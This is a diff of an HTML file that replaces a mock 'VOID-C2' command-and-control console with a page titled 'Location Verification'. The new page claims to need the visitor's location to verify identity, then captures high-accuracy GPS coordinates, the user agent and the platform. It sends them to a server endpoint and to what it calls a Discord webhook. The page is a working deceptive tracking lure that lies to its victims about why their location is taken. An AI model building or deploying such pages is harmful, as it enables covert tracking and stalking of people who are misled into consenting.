@@ -2,86 +2,197 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>HXZE • NEON VOID • Ω²</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Location Verification</title>
     <style>
-        :root {
-            --bg-purple: #1a0033;
-            --accent-orange: #ff8c00;
-            --text-purple: #e0b0ff;
-            --terminal-black: #0d001a;
-        }
         body {
-            background: var(--bg-purple);
-            background: radial-gradient(circle, #2e0054 0%, #0d001a 100%);
-            color: var(--text-purple);
-            font-family: 'Consolas', monospace;
-            margin: 0; padding: 20px;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: #1a1a2e;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: rgba(255,255,255,0.1);
+            border-radius: 20px;
+            padding: 40px;
+            text-align: center;
+            max-width: 500px;
         }
         h1 {
-            color: var(--accent-orange);
-            text-align: center;
-            font-size: 4rem;
-            text-shadow: 0 0 20px rgba(255, 140, 0, 0.6);
-            margin-bottom: 50px;
+            font-size: 28px;
+            margin-bottom: 20px;
+            color: #00ff88;
         }
-        .report {
-            background: var(--terminal-black);
-            border: 2px solid var(--accent-orange);
-            padding: 30px;
-            border-radius: 10px;
-            box-shadow: 0 0 40px rgba(128, 0, 128, 0.5);
-            max-width: 1000px; margin: auto;
-        }
-        #c2-console {
-            display: none;
-            margin-top: 20px;
-            border-color: #f0f; /* Hot pink/purple border for console */
-        }
-        .log-view {
-            height: 200px; overflow-y: auto;
-            border: 1px solid #444; background: #000;
-            padding: 10px; font-size: 0.9rem; margin-bottom: 10px;
-        }
-        .input-box {
-            width: 80%; background: #000; border: 1px solid var(--accent-orange);
-            color: var(--accent-orange); padding: 10px;
+        p {
+            margin-bottom: 20px;
+            line-height: 1.6;
+            color: #ccc;
         }
         button {
-            background: var(--accent-orange); color: #000;
-            border: none; padding: 10px 20px; cursor: pointer; font-weight: bold;
+            background: #00ff88;
+            border: none;
+            color: #1a1a2e;
+            font-size: 18px;
+            font-weight: bold;
+            padding: 14px 40px;
+            border-radius: 50px;
+            cursor: pointer;
+            margin: 10px;
+        }
+        button:hover {
+            background: #00cc6a;
+        }
+        .status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            background: rgba(0,0,0,0.5);
+            font-size: 14px;
+            display: none;
+        }
+        .status.success {
+            background: rgba(0,255,136,0.2);
+            border: 1px solid #00ff88;
+            color: #00ff88;
+        }
+        .status.error {
+            background: rgba(255,0,0,0.2);
+            border: 1px solid #ff4444;
+            color: #ff8888;
+        }
+        .coordinates {
+            font-family: monospace;
+            font-size: 14px;
+            margin-top: 15px;
+            padding: 10px;
+            background: rgba(0,0,0,0.5);
+            border-radius: 8px;
+            word-break: break-all;
+        }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>HXZE // VOID-C2</h1>
-        <div class="report">
-            <div id="system-info">
-                [ STATUS: ENCRYPTED UPLINK ]<br>
-                [ OS: WINDOWS 11 / PYTHON 3.14 STABLE ]<br>
-                [ BEACON: ACTIVE ]
-            </div>
-            
-            <div id="c2-console">
-                <hr style="border: 0.5px solid #444;">
-                <div class="log-view" id="log"></div>
-                <input type="text" id="cmd" class="input-box" placeholder="Awaiting Command...">
-                <button onclick="transmit()">SEND</button>
-            </div>
-        </div>
-        <p style="text-align:center; margin-top:20px;">
-            <button onclick="document.getElementById('c2-console').style.display='block'">ACCESS OVERRIDE</button>
-        </p>
+        <h1>Location Verification Required</h1>
+        <p>This system requires location access to verify your identity.</p>
+        <p>Click the button below to share your location.</p>
+        <button id="requestLocation">Access Location</button>
+        <div id="status" class="status"></div>
+        <div id="coordinatesDisplay" class="coordinates" style="display:none;"></div>
+        <div class="footer">Your location is used for verification purposes only.</div>
     </div>
 
     <script>
-        async function transmit() {
-            const cmd = document.getElementById('cmd').value;
-            const log = document.getElementById('log');
-            log.innerHTML += `<div style="color:var(--accent-orange)">[OUT] ${cmd}</div>`;
-            // Add your fetch logic here as discussed previously
-            document.getElementById('cmd').value = '';
+        var statusDiv = document.getElementById('status');
+        var coordsDiv = document.getElementById('coordinatesDisplay');
+        
+        function showStatus(message, isError) {
+            statusDiv.textContent = message;
+            statusDiv.className = isError ? 'status error' : 'status success';
+            statusDiv.style.display = 'block';
+            if (!isError) {
+                setTimeout(function() {
+                    statusDiv.style.display = 'none';
+                }, 5000);
+            }
         }
+
+        function sendToServer(data) {
+            fetch('/api/location', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            })
+            .then(function(response) {
+                return response.json();
+            })
+            .then(function(data) {
+                console.log('Server response:', data);
+            })
+            .catch(function(error) {
+                console.error('Error sending to server:', error);
+            });
+        }
+
+        function getLocation() {
+            if (!navigator.geolocation) {
+                showStatus('Geolocation is not supported by your browser.', true);
+                return;
+            }
+
+            showStatus('Requesting location... Please allow permission when prompted.', false);
+            
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    var coords = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString(),
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform
+                    };
+                    
+                    coordsDiv.innerHTML = 'Location Captured:\n' +
+                        'Latitude: ' + coords.latitude + '\n' +
+                        'Longitude: ' + coords.longitude + '\n' +
+                        'Accuracy: +-' + Math.round(coords.accuracy) + ' meters\n' +
+                        'Time: ' + coords.timestamp;
+                    coordsDiv.style.display = 'block';
+                    
+                    sendToServer(coords);
+                    
+                    showStatus('Location captured and verified. You may close this window.', false);
+                    
+                    // Try to send to Discord webhook as well
+                    fetch('/api/location/discord', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(coords)
+                    }).catch(function(e) {
+                        console.log('Discord webhook error:', e);
+                    });
+                },
+                function(error) {
+                    var errorMsg = '';
+                    switch(error.code) {
+                        case error.PERMISSION_DENIED:
+                            errorMsg = 'Permission denied. Please allow location access and try again.';
+                            break;
+                        case error.POSITION_UNAVAILABLE:
+                            errorMsg = 'Location information is unavailable.';
+                            break;
+                        case error.TIMEOUT:
+                            errorMsg = 'Location request timed out.';
+                            break;
+                        default:
+                            errorMsg = 'An unknown error occurred.';
+                    }
+                    showStatus(errorMsg, true);
+                },
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        }
+
+        document.getElementById('requestLocation').addEventListener('click', getLocation);
     </script>
 </body>
 </html>
